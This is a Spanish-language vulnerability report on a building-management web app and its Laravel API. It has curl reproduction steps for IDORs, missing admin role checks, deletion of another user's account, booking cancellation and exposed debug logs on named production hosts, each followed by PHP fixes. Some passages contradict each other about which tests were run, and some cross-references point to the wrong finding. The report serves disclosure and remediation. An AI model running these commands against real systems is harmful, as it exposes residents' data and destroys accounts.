# Reporte de vulnerabilidades — web.edificiopacifik.com

**Fecha de la evaluación:** 2026-07-08
**Alcance:** `https://web.edificiopacifik.com/` (frontend) y `https://website-a40e47dc.gtq.fvz.mybluehost.me/api/` (backend Laravel)
**Método:** pruebas manuales de caja negra vía `curl`, en el ambiente de producción. La mayoría de los hallazgos fueron confirmados en vivo, usando siempre cuentas de prueba desechables (creadas y borradas durante la evaluación) para las pruebas destructivas — nunca se modificaron datos de residentes reales sin revertirlo de inmediato.

---

## Resumen ejecutivo

**Riesgo general: crítico.** Se encontraron **12 hallazgos**, de los cuales **6 son críticos y ya confirmados en producción** (no hipótesis): cualquier residente autenticado puede leer y modificar datos de otros residentes, incluyendo cancelar sus reservas y ver el perfil completo de la cuenta administradora.

**Causa raíz común (no son 12 problemas aislados):** el backend confía en los identificadores que manda el cliente (`{id}` en la URL, o campos como `departament_id`/`user_id` en el body) en vez de verificar en el servidor que ese recurso realmente pertenece al usuario autenticado. El mismo patrón se repite en `UserController` y `BookingController`. Arreglar esto de raíz (con una Policy central, ver hallazgo 3) es más rápido y más seguro que parchar endpoint por endpoint.

### Qué hacer hoy, sin tocar código (5 minutos)
1. **Activar 2FA en la cuenta admin** (`id=1`, `username: admin`) — hallazgo 3. Cualquier residente puede identificarla y perfilarla ahora mismo.
2. `APP_DEBUG=false` en `.env` de producción + `php artisan config:cache` — hallazgo 1. Corrige de raíz que **toda** la API filtre stack traces con rutas del servidor a cualquiera, no solo estas rutas puntuales.
3. Bloquear `/storage/` a nivel de servidor web y rotar el log ya expuesto — hallazgo 2. Ese log alcanzó los 9.3 MB públicos.

### Qué arreglar esta semana (cambios de código, alto impacto)
| Hallazgo | Qué falla | Impacto real demostrado |
|---|---|---|
| 3 | `GET /api/users/byId/{id}` sin chequeo de propiedad | Cualquiera lee el perfil de cualquiera — incluido el admin |
| 4 | `GET /api/users/admin/get_pendings` sin chequeo de rol | Residente normal ve datos operativos de todo el edificio |
| 9 | `GET /api/bookings/byId/{id}` sin chequeo de propiedad | Cualquiera lee reservas ajenas (montos, notas, pagos) |
| 12 | `POST /api/bookings/cancel/{id}` sin chequeo de propiedad | **Probado cruzado con 2 cuentas reales**: cada una canceló la reserva de la otra |
| 5 | `DELETE /api/users/d/{id}` y `POST /api/users/assing_apartmet` sin chequeo de rol | Se borró una cuenta de prueba con un token normal, sin ser admin |
| 11 | `POST /api/bookings` no valida unidad ni `departament_id` | Usuario sin propiedad bloqueó un amenity pago sin poder ser facturado |

### Qué arreglar después (importante pero menor impacto inmediato)
- Hallazgo 6: faltan cabeceras de seguridad (HSTS, CSP, X-Frame-Options).
- Hallazgo 7: tokens sin expiración + `complete-first-time` no pide password actual (riesgo si se roba un token).
- Hallazgo 10: `notices/byId` expone email/username/device_token del admin.
- Hallazgo 8: fuga menor de infraestructura (Bluehost).

### Buenas señales encontradas (no todo está roto)
`PUT /api/users/resident/{id}`, `POST /api/users/temporary-or-resident`, `POST /api/users/complete-first-time` y `GET /api/visits/byId/{id}` **sí** implementan el chequeo de propiedad correctamente. Sirven de referencia de código para replicar el patrón en los endpoints que fallan — el equipo ya sabe cómo hacerlo bien, solo no lo aplicó en todos lados.

**Detalle completo, comandos de reproducción y remediación específica por hallazgo abajo.**

> ⚠️ Usa este documento solo contra tu propio entorno y, si es posible, primero en un entorno de *staging*. Antes de correr las pruebas de login, define tus credenciales como variables de entorno para no dejarlas en texto plano en el historial de shell:
> ```bash
> export PACIFIK_USER="tu_usuario"
> export PACIFIK_PASS="tu_password"
> export BASE="https://website-a40e47dc.gtq.fvz.mybluehost.me"
> export SITE="https://web.edificiopacifik.com"
> ```

---

## Índice de hallazgos

| # | Severidad | Hallazgo |
|---|-----------|----------|
| 1 | 🔴 Crítica | `APP_DEBUG=true` expone stack traces sin autenticación |
| 2 | 🔴 Crítica | `storage/logs/laravel.log` público y descargable |
| 3 | 🔴 Crítica | IDOR en `/api/users/byId/{id}` — datos de cualquier residente |
| 4 | 🔴 Crítica | Broken Function Level Authorization en `/api/users/admin/get_pendings` |
| 5 | 🔴 Crítica | Rutas de escritura: `DELETE` y `assing_apartmet` confirmados sin validar rol/propiedad (otras 3 sí están protegidas) |
| 6 | 🟠 Alta | Faltan cabeceras de seguridad HTTP (HSTS, CSP, X-Frame-Options, etc.) |
| 7 | 🟡 Media | Tokens de API de larga duración devueltos en el body del login |
| 8 | 🟢 Baja | Cabecera `host-header` filtra el proveedor de hosting |
| 9 | 🔴 Crítica | IDOR en `/api/bookings/byId/{id}` — reservas de cualquier residente |
| 10 | 🟡 Media | `/api/notices/byId/{id}` expone datos del admin y quién vio el aviso |
| 11 | 🟠 Alta | `POST /api/bookings` permite reservar (incluso pagado/exclusivo) sin tener unidad asignada |
| 12 | 🔴 Crítica | `POST /api/bookings/cancel/{id}` permite cancelar la reserva de cualquier otro usuario |

---

## 1. 🔴 Modo debug activo en producción (`APP_DEBUG=true`)

**Descripción:** cualquier error no controlado en el backend devuelve la página de depuración completa de Laravel (stack trace, rutas del servidor, código fuente) a usuarios **no autenticados**.

**Cómo reproducir:**
```bash
curl -s -D - "$BASE/api/user" | head -40
```

**Resultado vulnerable:** HTTP 500 con una página HTML larga (cientos de KB) que incluye rutas como `/home4/bluelata/public_html/website_c67adca2/...`, clases de excepción (`RouteNotFoundException`, etc.) y código fuente resaltado.

**Resultado esperado tras el fix:** HTTP 401/404 con un JSON corto tipo `{"message":"Unauthenticated."}`, sin trazas ni rutas de servidor.

**Remediación:**
```bash
# En el servidor, dentro del backend Laravel
# .env
APP_DEBUG=false
APP_ENV=production
```
```bash
php artisan config:cache
php artisan route:cache
```

---

## 2. 🔴 Log de aplicación público (`storage/logs/laravel.log`)

**Descripción:** el archivo de logs de Laravel (varios MB) es descargable sin autenticación. Puede contener rutas del servidor, queries, excepciones y datos sensibles.

**Cómo reproducir (solo cabeceras, no descargues el archivo completo):**
```bash
curl -sI "$BASE/storage/logs/laravel.log"
```

**Resultado vulnerable:** `HTTP/2 200` con `content-type: text/x-log` y un `content-length` grande (varios MB).

**Resultado esperado tras el fix:** `HTTP/2 403` o `404`.

**Remediación:**
- Verifica que el **document root** del servidor apunte a la carpeta `public/` de Laravel y no a la raíz del proyecto (si apunta a la raíz, `storage/` queda expuesta).
- Como capa adicional, bloquea la carpeta por servidor web. En Apache (`.htaccess` dentro de `storage/` o en la config del vhost):
  ```apache
  <IfModule mod_authz_core.c>
      Require all denied
  </IfModule>
  <IfModule !mod_authz_core.c>
      Order allow,deny
      Deny from all
  </IfModule>
  ```
- Rota el log expuesto y, dado que estuvo accesible, **rota credenciales** que puedan haber quedado registradas (DB, claves de terceros como Firebase).

---

## 3. 🔴 IDOR en `/api/users/byId/{id}`

**Descripción:** un usuario autenticado con rol normal ("Propietario") puede ver el perfil de **cualquier otro usuario** cambiando el ID, sin verificación de pertenencia ni rol.

**Cómo reproducir:**
```bash
# 1) Login para obtener un token
LOGIN=$(curl -s -X POST "$BASE/api/login" \
  -H "Content-Type: application/json" -H "Accept: application/json" \
  -d "{\"username\":\"$PACIFIK_USER\",\"password\":\"$PACIFIK_PASS\"}")
TOKEN=$(echo "$LOGIN" | grep -oE '"token":"[^"]*"' | cut -d'"' -f4)
echo "Token: $TOKEN"

# 2) Consultar tu propio perfil (control)
MY_ID=438   # reemplaza por tu id real (lo ves en la respuesta de /api/user)
curl -s -H "Authorization: Bearer $TOKEN" -H "Accept: application/json" \
  "$BASE/api/users/byId/$MY_ID" | head -c 500

# 3) Consultar el perfil de OTRO usuario (id vecino)
OTHER_ID=439
curl -s -H "Authorization: Bearer $TOKEN" -H "Accept: application/json" \
  "$BASE/api/users/byId/$OTHER_ID" | head -c 500
```

**Resultado vulnerable:** el paso 3 devuelve `HTTP 200` con el `name`, `phone`, `rol_id`, fechas, etc. de un usuario que no eres tú.

**Resultado esperado tras el fix:** `HTTP 403` (o 404) si el usuario autenticado no es el dueño del recurso ni tiene rol de administrador.

**🔴 Agravante confirmado (2026-07-09): la cuenta admin es trivial de identificar y perfilar con este mismo IDOR.**
```bash
curl -s -H "Authorization: Bearer $TOKEN" -H "Accept: application/json" "$BASE/api/users/byId/1"
```
Con cualquier token de residente normal, `id=1` devolvió el perfil completo del **administrador del sistema**:
```json
{"id":1,"name":"admin","email":"admin@gmail.com","username":"admin","rol_id":1,"two_factor_confirmed_at":null,"device_token":"...", "units":[{"number":"P11-020",...}]}
```
Esto es más grave que "un residente ve datos de otro residente", por tres razones:
1. **El ID admin es predecible.** En casi cualquier sistema, `id=1` es la primera cuenta creada = el admin. Un atacante no necesita enumerar nada, prueba `id=1` primero.
2. **`rol_id` delata quién es el admin sin ambigüedad.** Los residentes normales tienen `rol_id` 2/3/4 — ver `rol_id:1` confirma inmediatamente "este es el objetivo de mayor privilegio".
3. **La cuenta admin no tiene 2FA activado** (`"two_factor_confirmed_at": null`). Combinado con que su `username` (`admin`) y `email` (`admin@gmail.com`, un dominio genérico) quedan expuestos por el mismo bug, es un objetivo directo para relleno de credenciales, fuerza bruta dirigida o phishing — sin 2FA de por medio.
4. También se filtra su `device_token` de Firebase (notificaciones push) — riesgo menor, pero tampoco debería ser visible para un residente.

**Recomendación adicional específica para esta cuenta, mientras se corrige el IDOR de fondo:**
- Activa 2FA en la cuenta admin **ya**, no esperes al fix del endpoint.
- Considera cambiar el `username`/email de la cuenta admin a algo no adivinable (evita `admin`/`admin@gmail.com` como identidad pública), como mitigación adicional mientras se despliega el fix.

**Remediación (Laravel):** usar **Policies** o comprobación explícita en el controlador:
```php
public function byId(Request $request, $id)
{
    $user = $request->user();

    if ($user->id != $id && !$user->hasRole('admin')) {
        abort(403);
    }

    // ... resto de la lógica
}
```
Aplica el mismo patrón (`Gate::authorize` / Policy) a **todas** las rutas que reciben un `{id}`.

---

## 4. 🔴 Broken Function Level Authorization en endpoint de admin

**Descripción:** un usuario con rol "Propietario" (no admin) puede llamar a un endpoint pensado solo para administradores y obtener datos operativos de todo el edificio.

**Cómo reproducir:**
```bash
curl -s -H "Authorization: Bearer $TOKEN" -H "Accept: application/json" \
  -w "\n[HTTP %{http_code}]\n" \
  "$BASE/api/users/admin/get_pendings" | head -c 800
```

**Resultado vulnerable:** `HTTP 200` con JSON de reservas (`reserves`) de todo el edificio: usuario, departamento, fecha, monto, estado de pago.

**Resultado esperado tras el fix:** `HTTP 403`.

**Remediación:** aplicar middleware de rol a **todas** las rutas bajo `api/users/admin/*` (y revisar cualquier otra ruta con prefijo `admin`):
```php
// routes/api.php
Route::middleware(['auth:sanctum', 'role:admin'])->prefix('users/admin')->group(function () {
    Route::get('get_pendings', [UserController::class, 'getPendings']);
    // ...
});
```
Y verifica que el middleware `role:admin` realmente compruebe el rol en base de datos, no solo la existencia de un token válido.

---

## 5. 🔴 Rutas de escritura probablemente sin validar rol/propiedad (sin confirmar — pruébalas tú)

**Por qué se sospecha:** en los hallazgos 3 y 4 confirmamos que las rutas de **lectura** (`GET`) no validan que el usuario autenticado sea el dueño del recurso ni su rol. Revisando el bundle JS del frontend (`assets/index-*.js`) encontré estas rutas de **escritura** que probablemente tengan el mismo problema:

| Método | Ruta | Qué hace (según el nombre/uso en el frontend) | Riesgo si no valida rol | Estado |
|--------|------|------------------------------------------------|--------------------------|--------|
| `PUT` | `/api/users/resident/{id}` | Edita los datos de un residente | Cualquier usuario podría **modificar el perfil de otro residente** | ✅ **Confirmado protegido** — devuelve `403 {"code":403,"error":"No tiene permiso para editar este usuario."}` al probar con un ID ajeno (2026-07-08) |
| `DELETE` | `/api/users/d/{id}` | Borra un usuario | Cualquier usuario podría **eliminar la cuenta de otro residente** | 🔴 **Confirmado vulnerable** — devuelve `200 {"code":200,"data":"Usuario eliminado con éxito"}` con un ID ajeno (probado 2026-07-08 sobre una cuenta de prueba). **Parchear con prioridad máxima.** |
| `POST` | `/api/users/assing_apartmet` (payload real: `{"user": <id>, "idApartament": <id>}`) | Asigna una unidad a un usuario | Podría permitir **reasignar la propiedad de una unidad** a otra cuenta | 🔴 **Confirmado — falta chequeo de rol** (probado 2026-07-09). Devuelve `200 {"code":200,"data":"ok"}` para un usuario sin rol admin, y el registro del usuario dueño de la unidad quedó con `updated_at` modificado (se procesó la escritura). La reasignación en sí no se materializó — probablemente porque la unidad de prueba ya estaba ocupada y la lógica de negocio lo bloquea — pero el endpoint **no rechazó la petición por falta de permisos**, que es el problema de fondo. ⚠️ **Adicional (2026-07-09):** se intentó repetidamente hacer que este endpoint asigne realmente una unidad — incluyendo mover la propia unidad del probador (ya ocupada por él mismo) a otra cuenta de prueba — y **nunca se logró un cambio real**, siempre `200 "ok"` sin efecto. No se encontró ninguna unidad vacante en los rangos de ID probados. Es posible que la función esté rota/no implementada del todo (siempre no-op) independientemente del problema de autorización — el equipo debería confirmar si este endpoint sigue en uso real desde el panel de admin, o si es código muerto. |
| `POST` | `/api/users/temporary-or-resident` (payload real, `multipart/form-data`: `name`, `email`, `username`, `password`, `phone`, `parentesco`, `type` [`airbnb`\|`familiar`\|`inquilino`], `idApartament`, + `airbnb[...]` si aplica) | Crea un residente/familiar/huésped y lo asocia a una unidad | Podría permitir **inyectar cuentas falsas en la unidad de otro residente** | ✅ **Confirmado protegido** (probado 2026-07-09). Con `idApartament` ajeno (unidad de otro dueño) devuelve `500 {"code":500,"error":"No se pudo completar el registro: No tiene permiso para registrar usuarios en este departamento."}`. Control positivo con la unidad propia sí funcionó (`200`, creó y luego se limpió el usuario de prueba). El único defecto menor: el código de estado debería ser `403`/`422`, no `500`. |
| `POST` | `/api/users/complete-first-time` (payload real: `email`, `phone`, `password`, `password_confirmation` — sin `id`) | Completa el registro inicial (email/teléfono/password) del usuario autenticado | Riesgo bajo si el backend usa `$request->user()` en vez de un `id` del body | ✅ **Confirmado protegido contra IDOR** (probado 2026-07-09). Se intentó inyectar `id`/`user_id` extra en el body apuntando a otra cuenta de prueba, junto con una password nueva — el backend **ignoró esos campos** y solo actualizó la cuenta del token autenticado. No hay mass assignment ni IDOR aquí. ⚠️ **Pero sí hay un problema distinto**: el endpoint no exige `is_first_time=1` (se puede llamar cualquier cantidad de veces, no solo "la primera vez"), y **no pide la contraseña actual** para fijar una nueva. Esto significa que quien tenga un **token robado** (ver hallazgo 6: tokens en `localStorage` sin expiración clara, y hallazgo 2: logs expuestos que pudieron contener tokens) puede resetear la contraseña de la cuenta y tomar control permanente, sin conocer la contraseña original. |

**Nota:** que `PUT`, `temporary-or-resident` y `complete-first-time` estén protegidos es buena señal — el equipo sí sabe implementar el chequeo correctamente en algunos controladores. El problema es la **inconsistencia**: `DELETE /api/users/d/{id}` y `POST /api/users/assing_apartmet` no tienen el mismo chequeo. Recomienda a los desarrolladores replicar el patrón de los endpoints protegidos en los que fallan.

**Hallazgo adicional (matiz, no vulnerabilidad de por sí):** al probar `temporary-or-resident`, confirmamos que una cuenta **familiar** (rol_id=4, agregada por el dueño a una unidad) puede a su vez crear más residentes en esa misma unidad — no solo el "Propietario" original puede hacerlo. El chequeo de autorización es "¿estás vinculado a esta unidad?", no "¿eres el dueño/rol=Propietario?". Puede ser intencional (gestión familiar del hogar), pero vale la pena que el negocio confirme si un familiar debería poder invitar residentes sin aprobación del dueño.

> ⚠️ **No ejecuté estas pruebas yo mismo** porque un `PUT`/`DELETE` exitoso modifica o borra datos reales de producción, y no hay forma de "probar sin efecto" un borrado. Dado que ya se confirmó el patrón de falla en lecturas (hallazgos 3 y 4), lo responsable es que **tú** las pruebes con control total sobre el entorno (idealmente staging, o con un usuario y respaldo desechables en producción). El usuario que ejecuta esta evaluación ya probó `PUT /api/users/resident/{id}` (ver tabla) y confirmó que **sí está protegido** — quedan 4 rutas por revisar.

### Cómo probarlas de forma segura

**Paso 0 — Prepárate para poder revertir:**
1. Si tienes entorno de *staging* con los mismos datos, pruébalo ahí primero.
2. Si solo tienes producción: crea o identifica una **cuenta de prueba desechable** (no un vecino real) para usar como "víctima", y guarda su estado actual (`GET /api/users/byId/{id}`) antes de tocar nada, para poder restaurarlo si el ataque tiene éxito.
3. Obtén los nombres de campo exactos del payload abriendo las DevTools del navegador (F12 → *Network*) mientras realizas la acción legítima en la interfaz (p. ej. editar tu propio perfil), en vez de adivinarlos — el JS está minificado y no expone los nombres de campo de forma legible.

**Paso 1 — Login con tu token (igual que en los hallazgos anteriores):**
```bash
LOGIN=$(curl -s -X POST "$BASE/api/login" \
  -H "Content-Type: application/json" -H "Accept: application/json" \
  -d "{\"username\":\"$PACIFIK_USER\",\"password\":\"$PACIFIK_PASS\"}")
TOKEN=$(echo "$LOGIN" | grep -oE '"token":"[^"]*"' | cut -d'"' -f4)
```

**Paso 2 — `PUT /api/users/resident/{id}` con un ID que NO es el tuyo (✅ ya probado, resultado: protegido):**
```bash
VICTIM_ID=439   # usa una cuenta de prueba, no un vecino real

# 2a) Guarda el estado actual antes de modificar nada
curl -s -H "Authorization: Bearer $TOKEN" -H "Accept: application/json" \
  "$BASE/api/users/byId/$VICTIM_ID" > /tmp/victim_before.json
cat /tmp/victim_before.json

# 2b) Intenta editar un campo inofensivo (ajusta el JSON según los campos reales que viste en DevTools)
curl -s -X PUT "$BASE/api/users/resident/$VICTIM_ID" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -H "Accept: application/json" \
  -d '{"name":"PRUEBA-SEGURIDAD-NO-GUARDAR"}' \
  -w "\n[HTTP %{http_code}]\n"

# 2c) Verifica si realmente cambió
curl -s -H "Authorization: Bearer $TOKEN" -H "Accept: application/json" \
  "$BASE/api/users/byId/$VICTIM_ID"
```
- **Vulnerable:** `HTTP 200` y el paso 2c muestra el nombre cambiado a `"PRUEBA-SEGURIDAD-NO-GUARDAR"`.
- **Correcto:** `HTTP 403`, sin cambios en 2c.
- **Si es vulnerable:** restaura el valor original inmediatamente con el mismo `PUT` usando los datos guardados en `/tmp/victim_before.json`.

**Paso 3 — `DELETE /api/users/d/{id}` (✅ ya probado, resultado: vulnerable):**
```bash
TEST_ID=999999   # id de una cuenta creada específicamente para esta prueba

curl -s -X DELETE "$BASE/api/users/d/$TEST_ID" \
  -H "Authorization: Bearer $TOKEN" -H "Accept: application/json" \
  -w "\n[HTTP %{http_code}]\n"
```
- **Vulnerable:** `HTTP 200`/`204` y el usuario de prueba desaparece. ← **esto pasó, con el usuario de prueba id=4.**
- **Correcto:** `HTTP 403`.
- ⚠️ Ya no repitas esta prueba — el patrón quedó confirmado. El usuario de prueba id=4 quedó borrado (o soft-deleted); no lo reutilices como `TEST_ID` en el paso 4, usa uno nuevo.

**Paso 4 — `POST /api/users/assing_apartmet` (✅ ya probado, campos reales confirmados leyendo el chunk `assignPropertyPage-CtUOTPtg.js`: `{"user": <id>, "idApartament": <id>}`):**

Resultado: probado con `user=607` (cuenta "Actor Prueba") e `idApartament=6` (unidad real P3-025, ya ocupada). Respuesta `200 {"code":200,"data":"ok"}`. La unidad **no** se movió (bloqueado por lógica de negocio: probablemente no permite asignar una unidad ya ocupada), pero el `updated_at` del dueño real de esa unidad cambió — confirma que el endpoint procesó la escritura sin exigir rol admin. **Vulnerabilidad de autorización confirmada**, aunque el impacto de negocio específico de esa prueba fue nulo.

Si quieres confirmar el impacto completo (reasignar de verdad), repite con una **unidad de prueba libre** (sin dueño) en vez de una ocupada — pero ya no es necesario para probar el hallazgo, el punto de autorización ya quedó demostrado.

**Remediación (aplica a las 5 rutas):** el mismo patrón de los hallazgos 3 y 4 — verificar en el controlador que `$request->user()->id == $id` o que el usuario tenga rol de administrador antes de ejecutar la escritura:
```php
public function update(Request $request, $id)
{
    $user = $request->user();

    if ($user->id != $id && !$user->hasRole('admin')) {
        abort(403);
    }

    // ... lógica de actualización
}

public function destroy(Request $request, $id)
{
    if (!$request->user()->hasRole('admin')) {
        abort(403);
    }

    // ... lógica de borrado
}
```
Considera además una **Policy** centralizada (`php artisan make:policy UserPolicy`) para no repetir esta lógica en cada método.

**Remediación específica para `complete-first-time`:**
```php
public function completeFirstTime(Request $request)
{
    $user = $request->user();

    // No permitir repetir el flujo indefinidamente
    if (!$user->is_first_time) {
        abort(409, 'Este usuario ya completó su configuración inicial.');
    }

    // Si en el futuro se usa también como "cambiar mi contraseña" fuera del
    // flujo de primera vez, exigir la contraseña actual:
    // if (!Hash::check($request->current_password, $user->password)) { abort(403); }

    // ... actualizar email/phone/password y marcar is_first_time = false
}
```
Esto limita el impacto de un token robado: ya no bastaría con el token para resetear la contraseña indefinidamente una vez que el usuario completó su configuración inicial.

---

## 6. 🟠 Faltan cabeceras de seguridad HTTP

**Cómo reproducir:**
```bash
curl -sI "$SITE/" | grep -iE "strict-transport|x-frame|x-content-type|content-security|referrer-policy"
curl -sI "$BASE/" | grep -iE "strict-transport|x-frame|x-content-type|content-security|referrer-policy"
```

**Resultado vulnerable:** ambos comandos no devuelven ninguna línea (las cabeceras no existen).

**Remediación:** agrega un middleware global en Laravel (o configúralo en Apache) que añada:
```
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: strict-origin-when-cross-origin
Content-Security-Policy: default-src 'self'; ...  (ajusta según tus dominios de fonts/scripts externos: fonts.bunny.net, fonts.googleapis.com, js.culqi.com)
```

---

## 7. 🟡 Tokens de API de larga duración en el login

**Descripción:** `/api/login` devuelve un token Sanctum sin expiración visible, probablemente guardado en `localStorage` por el SPA (no en cookie `httpOnly`).

**Cómo verificar dónde se guarda:** abre las DevTools del navegador (F12) → pestaña *Application* → *Local Storage*, tras iniciar sesión en `https://web.edificiopacifik.com/`. Si el token aparece ahí, es robable por XSS.

**Remediación:**
- Configurar expiración de tokens Sanctum (`expiration` en `config/sanctum.php`).
- Evaluar migrar a autenticación por cookies `httpOnly` + SameSite (Sanctum SPA mode) en vez de Bearer token en `localStorage`.
- Mitiga el impacto arreglando el punto 5 (CSP), que reduce la probabilidad de XSS.

---

## 8. 🟢 Fuga menor de información (header `host-header`)

**Cómo reproducir:**
```bash
curl -sI "$SITE/" | grep -i "host-header"
```

**Resultado:** un valor en base64 que decodifica a `shared.bluehost.com`:
```bash
echo "c2hhcmVkLmJsdWVob3N0LmNvbQ==" | base64 -d
```

**Remediación:** es una cabecera propia de la infraestructura compartida de Bluehost; consulta con soporte de Bluehost si se puede desactivar. Riesgo bajo, prioridad baja.

---

## 9. 🔴 IDOR en `/api/bookings/byId/{id}`

**Descripción:** cualquier usuario autenticado puede ver la reserva de área común de **cualquier otro residente** cambiando el ID — mismo patrón que el hallazgo 3, pero en otro controlador. Expone monto, fecha, horario, nota, motivo y estado de pago de la reserva.

**Cómo reproducir:**
```bash
LOGIN=$(curl -s -X POST "$BASE/api/login" -H "Content-Type: application/json" -H "Accept: application/json" \
  -d "{\"username\":\"$PACIFIK_USER\",\"password\":\"$PACIFIK_PASS\"}")
TOKEN=$(echo "$LOGIN" | grep -oE '"token":"[^"]*"' | cut -d'"' -f4)

# Prueba con varios IDs consecutivos — no necesitas saber de antemano de quién son
for i in 1 2 3 4 5; do
  echo "--- booking $i ---"
  curl -s -H "Authorization: Bearer $TOKEN" -H "Accept: application/json" "$BASE/api/bookings/byId/$i" \
    | grep -oE '"user_id":[0-9]+|"id":[0-9]+'
done
```

**Resultado vulnerable (confirmado 2026-07-09):** `HTTP 200` con el JSON completo de la reserva, incluyendo un `"user_id"` distinto al tuyo. En la prueba, con el token de `vvega` (id 438) se obtuvieron reservas de `user_id: 3` y `user_id: 431` sin ningún control.

**Resultado esperado tras el fix:** `HTTP 403` si `booking.user_id != $request->user()->id` y el usuario no es admin.

**Remediación:** mismo patrón que el hallazgo 3:
```php
public function byId(Request $request, $id)
{
    $booking = Booking::findOrFail($id);
    $user = $request->user();

    if ($booking->user_id != $user->id && !$user->hasRole('admin')) {
        abort(403);
    }

    return $booking->load('comun_area');
}
```

---

## 10. 🟡 Exposición de datos del administrador y de "quién vio" en `/api/notices/byId/{id}`

**Descripción:** el contenido del aviso en sí está pensado para ser público entre residentes (es un tablón de anuncios, eso es correcto). El problema es lo que viene **anidado** en la respuesta:
- El objeto `user` completo del administrador que publicó el aviso: `email`, `username`, `phone`, y su `device_token` (token push de Firebase) — visibles para cualquier residente que lea el aviso.
- Un array `views` con los **IDs de todos los usuarios que vieron el aviso** (`"views":"[3,442,401,431,1,438]"`), visible para cualquier residente — filtra quién leyó o no leyó cada comunicado.

**Cómo reproducir:**
```bash
curl -s -H "Authorization: Bearer $TOKEN" -H "Accept: application/json" "$BASE/api/notices/byId/3" | python3 -m json.tool
```
Busca los campos `user.email`, `user.username`, `user.device_token` y `views` en la respuesta.

**Impacto:** bajo-medio. El email/username del admin facilita ataques dirigidos (phishing, fuerza bruta contra esa cuenta específica sabiendo que es la de mayor privilegio). El array `views` es una fuga de privacidad menor (metadatos de lectura) pero no debería ser visible para residentes comunes.

**Remediación:** en el `Resource`/serializer de `Notice`, no incluyas el modelo `User` completo — solo el campo `name` (o `name` + iniciales) del autor, y mueve el array `views` a una respuesta separada accesible solo para admins (o a un endpoint tipo `/api/notices/{id}/analytics` con su propio chequeo de rol):
```php
// NoticeResource.php
public function toArray($request)
{
    return [
        // ... resto de campos
        'author_name' => $this->user->name,   // no exponer el modelo User completo
        // 'views' => omitir aquí, moverlo a un endpoint admin-only si hace falta
    ];
}
```

---

## Otras rutas revisadas en esta ronda (2026-07-09)

| Ruta | Resultado |
|------|-----------|
| `GET /api/visits/byId/{id}` | ✅ **Protegida** — con una visita ajena devuelve `403 {"code":403,"error":"No tienes permisos para ver esta visita"}`. Buen ejemplo de implementación correcta, sirve de referencia para arreglar los hallazgos 3 y 9. |
| `GET /api/quotas`, `GET /api/pays?...` | ⬜ **Inconclusivo** — con la cuenta de prueba usada (`vvega`, sin cuotas/pagos pendientes) ambas rutas devolvieron `{"data":[]}` incluso al agregar parámetros `user_id`/`departament_id` de otras cuentas, lo cual sugiere que ignoran esos parámetros y solo devuelven datos del usuario autenticado (buena señal), pero **no se pudo confirmar con datos reales** porque la cuenta de prueba no tiene cuotas ni pagos registrados. Repite la prueba con una cuenta que sí tenga saldo pendiente para cerrar este punto. |
| `GET /api/events`, `GET /api/events/byId/{id}` | ℹ️ Contenido pensado para ser compartido entre todos los residentes (cartelera de eventos del edificio) — no se considera fuga de datos por diseño. Solo existe el evento `id=1` en el ambiente de prueba, no se pudo probar con eventos de distintos "dueños". |

**Nota importante sobre todas las rutas sin token de esta ronda:** `quotas`, `pays`, `bookings/byId`, `events`, `events/byId`, `notices/byId` y `visits` devuelven **`HTTP 500`** (no `401`) cuando se llaman sin token — es el mismo síntoma del hallazgo 1 (`APP_DEBUG=true`), y confirma que el problema no es aislado a `/api/user`, sino que afecta a **toda la API**. Arreglar el hallazgo 1 corrige esto de raíz en todas las rutas a la vez.

---

## 11. 🟠 Bug de negocio: `POST /api/bookings` no valida que el usuario tenga una unidad asignada

**Descripción (reportado por el usuario, confirmado 2026-07-09):** la cuenta `pacifikprueba` (id 607, `"units":[]`, sin ningún departamento asignado) pudo crear reservas de áreas comunes con `"departament_id": null` — tanto en modalidad **gratuita** (`id=37`, uso compartido, `amount:0`) como en modalidad **exclusiva/paga** (`id=38`, `amount:30`, `status_label:"Pago pendiente"`).

**Por qué importa, más allá de "no debería poder reservar":**
- La reserva **exclusiva bloquea el espacio real** para esa fecha/hora (el reglamento del área dice "el ambiente permanecerá cerrado... apertura únicamente mediante reserva previa"). Un usuario sin ninguna propiedad en el edificio pudo bloquear el co-working de pago.
- Quedó en estado `"Pago pendiente"` con `pay_id: null` y **sin `departament_id`** — es decir, no hay ninguna unidad a la cual facturarle o cobrarle esos S/ 30. No hay forma de cobrar esa reserva por los canales normales (que dependen de la unidad/cuenta de mantenimiento del departamento).
- El propio frontend ya sabe que el usuario no tiene departamento (por eso manda `departament_id: null`), pero el backend no lo rechaza — la validación que falta es 100% del lado del servidor.

**Cómo reproducir:**
```bash
LOGIN=$(curl -s -X POST "$BASE/api/login" -H "Content-Type: application/json" -H "Accept: application/json" \
  -d "{\"username\":\"$PACIFIK_USER\",\"password\":\"$PACIFIK_PASS\"}")
TOKEN=$(echo "$LOGIN" | grep -oE '"token":"[^"]*"' | cut -d'"' -f4)

# Usa una cuenta que sepas que NO tiene unidad asignada ("units": [] en /api/user)
curl -s -X POST "$BASE/api/bookings" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -H "Accept: application/json" \
  -d '{
    "date": "2026/08/01",
    "time_from": "10:00",
    "time_to": "12:00",
    "typeOfReserve": 2,
    "note": "",
    "is_exclusive": true,
    "terms_accept": true,
    "multa_accept": true,
    "pay_later": true,
    "departament_id": null,
    "comun_area": 7,
    "amount": 30,
    "exclusive": 1
  }' -w "\n[HTTP %{http_code}]\n"
```
- **Vulnerable:** `HTTP 200` con `{"toPay":false,"id":<nuevo_id>}` — la reserva se crea igual.
- **Correcto:** debería rechazar con un error tipo "Debes tener una unidad asignada para reservar áreas comunes."

**Limpieza (cancelar una reserva de prueba creada así):**
```bash
curl -s -X POST "$BASE/api/bookings/cancel/<id>" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -H "Accept: application/json" -d '{}' \
  -w "\n[HTTP %{http_code}]\n"
```

**Remediación:**
```php
public function store(Request $request)
{
    $user = $request->user();
    $unitIds = $user->units()->pluck('id');

    if ($unitIds->isEmpty()) {
        abort(422, 'Debes tener una unidad asignada para reservar áreas comunes.');
    }

    // Un usuario puede tener más de una unidad (ver nota de cardinalidad abajo).
    // NO uses siempre first(): valida que el departament_id recibido sea
    // realmente una de las unidades del usuario autenticado.
    $departamentId = $request->input('departament_id');
    if (!$unitIds->contains($departamentId)) {
        abort(422, 'La unidad indicada no te pertenece.');
    }

    // ... crear la reserva con $departamentId, ya validado
}
```

